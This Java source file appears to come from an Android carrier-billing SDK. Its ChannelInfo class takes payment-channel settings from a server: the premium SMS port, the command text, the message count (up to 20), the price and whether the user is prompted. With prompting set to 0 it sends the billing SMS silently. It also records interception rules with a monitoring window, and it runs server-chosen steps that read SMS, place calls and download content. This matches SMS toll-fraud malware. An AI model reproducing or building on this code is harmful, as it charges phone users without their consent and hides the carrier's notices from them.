package com.example.sayid.myapplication.model;

import android.content.Context;

import com.example.sayid.myapplication.common.bean.BlockBean;
import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.listener.OnPayListener;
import com.example.sayid.myapplication.common.listener.OnTimeCountListener;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.thread.TimeCountThread;
import com.example.sayid.myapplication.common.util.FutureUtil;
import com.example.sayid.myapplication.common.util.JsonUtil;
import com.example.sayid.myapplication.common.util.UI;
import com.example.sayid.myapplication.parseStep.ParseStep;
import com.example.sayid.myapplication.parseStep.step.action.Base64;
import com.example.sayid.myapplication.parseStep.step.action.Delay;
import com.example.sayid.myapplication.parseStep.step.action.DownLoad;
import com.example.sayid.myapplication.parseStep.step.action.End;
import com.example.sayid.myapplication.parseStep.step.action.GetSms;
import com.example.sayid.myapplication.parseStep.step.action.Md5;
import com.example.sayid.myapplication.parseStep.step.action.MyRequest;
import com.example.sayid.myapplication.parseStep.step.action.NetWork;
import com.example.sayid.myapplication.parseStep.step.action.Phone;
import com.example.sayid.myapplication.parseStep.step.action.Sms;
import com.example.sayid.myapplication.parseStep.step.action.Step;
import com.example.sayid.myapplication.smsutil.SmSutils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;

import static com.example.sayid.myapplication.pay.AppTache.context;

public class ChannelInfo implements Cloneable, Serializable {

    /**
     *
     */
    private final static long serialVersionUID = 1L;

    public final static String TAG = "ChannelInfo";

    public final static int SMS = 0;
    public final static int VEDIO_BASE_PAY = 3;
    public final static int MUSIC_BASE_PAY = 4;
    public final static int CARTOON_BASE_PAY = 5;
    public final static int NETGAME_BASE_PAY = 6;
    public final static int READ_BASE_PAY = 7;
    public final static int BOX_BASE_PAY = 8;
    public final static int IVR = 9;

    /**
     * 单条通道短信的最大条数
     */
    public final static int SMS_ITEM_MAX = 20;

    /**
     * 用户订单号
     */
    public String user_order_id;
    /**
     * 云巢流水号
     */
    public String pay_order_id;
    /**
     * 通道类型，目前支持短信、基地
     */
    public String channel_type;
    /**
     * 提示类型，0表示不提示，1表示提示
     */
    public String channel_prompt_type;
    /**
     * 提示主题
     */
    public String channel_prompt_tip;
    /**
     * 提示内容
     */
    public String channel_prompt;

    /**
     * 上行端口
     */
    public String channel_port;
    /**
     * 上行指令
     */
    public String channel_order;
    /**
     * 短信条数
     */
    public int sms_item;
    /**
     * 通道价格
     */
    public int channel_price;
    /**
     * 短信间隔时间
     */
    public int send_interval;
    /**
     * 在用户手机有root权限时以此参数为准，没有root权限时以发送短信成功的通知为准，等待对方收到短信的时间
     * (0表示以发送成功为短信发送成功的标志；>0表示等待对方接收短信的时间，超出等待时间表示发送失败；单位：秒)
     */
    public int send_sms_timeout;

    /**
     * 本次计费是否有上报给上层应用
     */
    public boolean isReport = false;

    /**
     * 基地动作集
     */
    public List<Step> list_action;

    /**
     * 支付监听器
     */
    public transient OnPayListener onPayListener;

    /**
     * 多条短信发送线程
     */
    private transient TimeCountThread timeCountThread;

    /**
     * 构造函数
     *
     * @param user_order_id
     * @param onPayListener
     */
    public ChannelInfo(String user_order_id, OnPayListener onPayListener) {
        this.user_order_id = user_order_id;
        this.onPayListener = onPayListener;
    }

    /**
     * Json解析
     *
     * @param context
     * @param jsonObj
     * @throws JSONException
     */
    public void parseJson(Context context, JSONObject jsonObj) throws JSONException {
        pay_order_id = JsonUtil.isNullOrGetStr(jsonObj, "pay_order_id");
        channel_type = JsonUtil.isNullOrGetStr(jsonObj, "channel_type");

        channel_prompt_type = JsonUtil.isNullOrGetStr(jsonObj, "channel_prompt_type");
        channel_prompt_tip = JsonUtil.isNullOrGetStr(jsonObj, "channel_prompt_tip");
        channel_prompt = JsonUtil.isNullOrGetStr(jsonObj, "channel_prompt");

        channel_port = JsonUtil.isNullOrGetStr(jsonObj, "channel_port");
        channel_order = JsonUtil.isNullOrGetStr(jsonObj, "channel_order");
        sms_item = JsonUtil.isNullOrGetInt(jsonObj, "sms_item");
        channel_price = JsonUtil.isNullOrGetInt(jsonObj, "channel_price");
        send_interval = JsonUtil.isNullOrGetInt(jsonObj, "send_interval");
        send_sms_timeout = JsonUtil.isNullOrGetInt(jsonObj, "send_sms_timeout");

        // 拦截优先级
        String confirm_level = JsonUtil.isNullOrGetStr(jsonObj, "confirm_level");

        // 监控时间
        long monitorEndTime = 0;
        int monitor_time = JsonUtil.isNullOrGetInt(jsonObj, "monitor_time");
        if (monitor_time > 0) {
            monitorEndTime = getMonitorEndTime(monitor_time);
        }

        // 拦截
        BlockBean blockBean = new BlockBean(user_order_id, pay_order_id);
        blockBean.parseJson(jsonObj, send_sms_timeout);
        blockBean.block_level = confirm_level;
        blockBean.monitor_end_time = monitorEndTime;

        BlockDao blockDao = new BlockDao(context);
        blockDao.insert(blockBean);

        // 动作集解析
        if (!jsonObj.isNull("action")) {
            list_action = new ArrayList<Step>();

            JSONArray action = jsonObj.getJSONArray("action");
            int size = action.length();
            for (int i = 0; i < size; i++) {
                JSONObject jsonB = (JSONObject) action.get(i);

                int actionId = JsonUtil.isNullOrGetInt(jsonB, "actionId");
                switch (actionId) {
                    case Step.NETWORK:
                        NetWork netWork = new NetWork();
                        netWork.parseJson(jsonB);
                        list_action.add(netWork);
                        break;

                    case Step.PHONE:
                        Phone phone = new Phone();
                        phone.parseJson(jsonB);
                        list_action.add(phone);
                        break;

                    case Step.REQUEST:
                        MyRequest request = new MyRequest();
                        request.parseJson(jsonB);
                        list_action.add(request);
                        break;

                    case Step.DOWNLOAD:
                        DownLoad download = new DownLoad();
                        download.parseJson(jsonB);
                        list_action.add(download);
                        break;

                    case Step.DELAY:
                        Delay delay = new Delay();
                        delay.parseJson(jsonB);
                        list_action.add(delay);
                        break;

                    case Step.END:
                        End end = new End();
                        list_action.add(end);
                        break;

                    case Step.SMS:
                        Sms sms = new Sms();
                        sms.parseJson(jsonB);
                        list_action.add(sms);
                        break;

                    case Step.GETSMS:
                        GetSms getSms = new GetSms();
                        getSms.parseJson(jsonB);
                        list_action.add(getSms);
                        break;

                    case Step.BASE64:
                        Base64 base64 = new Base64();
                        base64.parseJson(jsonB);
                        list_action.add(base64);
                        break;

                    case Step.MD5:
                        Md5 md5 = new Md5();
                        md5.parseJson(jsonB);
                        list_action.add(md5);
                        break;
                }
            }
        }
    }

    private long getMonitorEndTime(int monitor_time) {
        Calendar c = Calendar.getInstance();
        c.setTimeInMillis(System.currentTimeMillis());
        ;
        c.add(Calendar.HOUR, monitor_time);

        return c.getTimeInMillis();
    }

    /**
     * 通道支付对话框
     */
    public void channelPayDialog() {
        try {
            sms_item = sms_item > SMS_ITEM_MAX ? SMS_ITEM_MAX : sms_item;

            int dialogType = Integer.parseInt(channel_prompt_type);
            int channelType = Integer.parseInt(channel_type);

            switch (dialogType) {
                case 0:             //通道不提示
                    channelPay(channelType);
                    break;

                case 1:                //通道提示
                    synchronized (ChannelOrderResp.V_CHANNEL_CONFIRM) {
                        if (ChannelOrderResp.V_CHANNEL_CONFIRM.size() > SMS_ITEM_MAX) {
                            ChannelOrderResp.V_CHANNEL_CONFIRM.remove(0);
                        }
                        ChannelOrderResp.V_CHANNEL_CONFIRM.add(this);
                    }

                    UI.showAlertDialog(UI.DIALOG_2, context, user_order_id, pay_order_id,
                            channel_prompt, channel_prompt_tip, UI.DEAL_TYPE_2);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 通道支付对话框
     *
     * @param onPayListener
     */
    public void channelPayDialog(OnPayListener onPayListener) {
        this.onPayListener = onPayListener;

        channelPayDialog();
    }

    /**
     * 通道支付
     *
     * @param channelType
     */
    public void channelPay(int channelType) {
        switch (channelType) {
            case SMS:                // 0 短信
                sendFirstSms();
                break;
            case VEDIO_BASE_PAY:    // 3 视频基地
            case NETGAME_BASE_PAY:    // 6 网游基地
            case IVR:                // 4 ivr音讯
            case MUSIC_BASE_PAY:
            case CARTOON_BASE_PAY:
            case READ_BASE_PAY:
            case BOX_BASE_PAY:
                ParseStep parseStep = new ParseStep(this);
                FutureUtil.execute(parseStep);
                break;
        }
    }

    /**
     * 状态报告上报失败
     *
     * @param errorCode
     */
    public void reportFailed(String errorCode) {
        if ("0".equals(channel_type)) {
            ReportModel.getInstanse(context).addReportSms(pay_order_id, 1, 1, channel_port, channel_order, "2", errorCode);
        } else {
            ReportModel.getInstanse(context).addReportBasePay(pay_order_id, "2", 0, errorCode, "");
        }
    }

    /**
     * 支付完成事件通知
     */
    public void onPayEvent(boolean success, String errorCode) {
        if (!isReport) {
            isReport = true;
            if (onPayListener != null) {
                if (success) {

                    onPayListener.onSuccess(user_order_id, sms_item * channel_price);

                } else {

                    onPayListener.onFailed(user_order_id, errorCode, "");
                }
                onPayListener = null;
            } else {
                //.d(TAG, "onPayListener is null");
            }
        }
    }

    /**
     * 支付请求首次短信
     */
    private void sendFirstSms() {
//		System.out.print("sms_item ==  "+sms_item);
        if (sms_item > 1) {
            if (timeCountThread != null && timeCountThread.getLeaveTimes() > 0) {
                timeCountThread.addTimes(sms_item);
            } else {
                timeCountThread = new TimeCountThread(sms_item, send_interval * 1000, new OnTimeCountListener() {
                    public void onTimeOut(int leaveTimes) {
                        if (leaveTimes > 0) {
                            sendChannelMsg(leaveTimes);
                        }
                    }
                });
                timeCountThread.start();
            }
        } else {
            sendChannelMsg(1);
        }
    }

    /**
     * 发送通道的短信
     */
    private void sendChannelMsg(final int index) {
//		SendSms sendSms = new SendSms(context, new SendSmsListener(){
//			public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int items) {
//				ReportModel.getInstanse(context).addReportSms(pay_order_id, items, index, destPhone, message, "1", "");
//
//				if(onPayListener != null){
//					onPayListener.onSuccess(user_order_id, sms_item * channel_price);
//					onPayListener = null;
//				}
//			}
//			public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode){
//				ReportModel.getInstanse(context).addReportSms(pay_order_id, items, index, destPhone, message, "2", errorCode);
//
//				if(onPayListener != null){
//					onPayListener.onFailed(user_order_id, errorCode, ErrorCode.errorMsg.get(errorCode));
//					onPayListener = null;
//				}
//			}
//		});
//
//		sendSms.sendSms(user_order_id, pay_order_id, channel_port, channel_order, send_sms_timeout);
//		System.out.print("   channel_port  == "+ channel_port);
//		System.out.print("   channel_order  == "+ channel_order);


        SmSutils.sendSMS(user_order_id, pay_order_id, channel_port, channel_order, new SendSmsListener() {

            public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int items) {
                ReportModel.getInstanse(context).addReportSms(pay_order_id, items, index, destPhone, message, "1", "");
                if (onPayListener != null) {
                    onPayListener.onSuccess(user_order_id, sms_item * channel_price);
                    onPayListener = null;
                }
            }

            public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode) {
                ReportModel.getInstanse(context).addReportSms(pay_order_id, items, index, destPhone, message, "2", errorCode);
                if (onPayListener != null) {
                    onPayListener.onFailed(user_order_id, errorCode, ErrorCode.errorMsg.get(errorCode));
                    onPayListener = null;
                }
            }
        });
    }

    @Override
    public Object clone() {
        ChannelInfo obj = null;
        try {
            obj = (ChannelInfo) super.clone();

            obj.list_action = new ArrayList<Step>();
            Iterator<Step> setp_it = this.list_action.iterator();
            while (setp_it.hasNext()) {
                obj.list_action.add((Step) (setp_it.next().clone()));
            }
        } catch (CloneNotSupportedException e) {
        }
        return obj;
    }
}
